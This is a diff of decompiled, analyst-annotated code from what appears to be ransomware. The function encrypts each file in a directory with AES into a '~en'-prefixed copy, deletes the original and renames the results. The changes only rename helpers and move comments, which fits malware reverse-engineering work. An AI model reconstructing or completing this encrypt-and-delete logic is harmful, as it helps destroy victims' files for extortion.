@@ -56,7 +56,7 @@ void EncryptAndRenameFiles_140007590(short *dir)
         input_addr = local_a68;
         ConcatWPath_140007b20(input_addr, 0x104, local_10e8.cFileName);
         GetModuleFileNameW((HMODULE)0x0, local_858, 0x104);
-        thunk_FUN_14000c700((undefined8 *)local_e98,
+        copy_14000c700((undefined8 *)local_e98,
                             (undefined8 *)local_10e8.cFileName, 6);
         /* Exclude "~en" */
         iVar2 = wcscmp(local_e98, L"~en");
@@ -69,7 +69,7 @@ void EncryptAndRenameFiles_140007590(short *dir)
           {
             CopyWPath_140007bc0(local_648, 0x104, dir);
             output_addr = local_648;
-            ConcatWPath_140007b20(output_addr, 0x104, (short *)&DAT_140070fd8);
+            ConcatWPath_140007b20(output_addr,0x104,L"~en");
             ConcatWPath_140007b20(output_addr, 0x104, local_10e8.cFileName);
             AES_Encrypt_140007080(input_addr, output_addr);
             DeleteFileW(input_addr);
@@ -78,6 +78,7 @@ void EncryptAndRenameFiles_140007590(short *dir)
       }
       BVar3 = FindNextFileW(local_1110, &local_10e8);
     } while (BVar3 != 0);
+    /* Rename */
     CopyWPath_140007bc0(local_e88, 0x104, dir);
     ConcatWPath_140007b20(local_e88, 0x104, L"\\~en*");
     local_1110 = FindFirstFileW(local_e88, &local_10e8);
@@ -88,7 +89,6 @@ void EncryptAndRenameFiles_140007590(short *dir)
     }
     else
     {
-      /* Rename */
       printf((char *)L"Preparing to rename files...\n");
       do
       {
@@ -99,7 +99,7 @@ void EncryptAndRenameFiles_140007590(short *dir)
           ConcatWPath_140007b20(local_10f0, 0x104, local_10e8.cFileName);
           thunk_FUN_14000cf50((undefined(*)[16])local_c78, 0, 0x208);
           uVar4 = thunk_FUN_14003cf74((undefined(*)[32])local_10e8.cFileName);
-          thunk_FUN_14000c700((undefined8 *)local_c78,
+          copy_14000c700((undefined8 *)local_c78,
                               (undefined8 *)(local_10e8.cFileName + 3),
                               uVar4 * 2 - 6);
           CopyWPath_140007bc0(local_228, 0x104, dir);
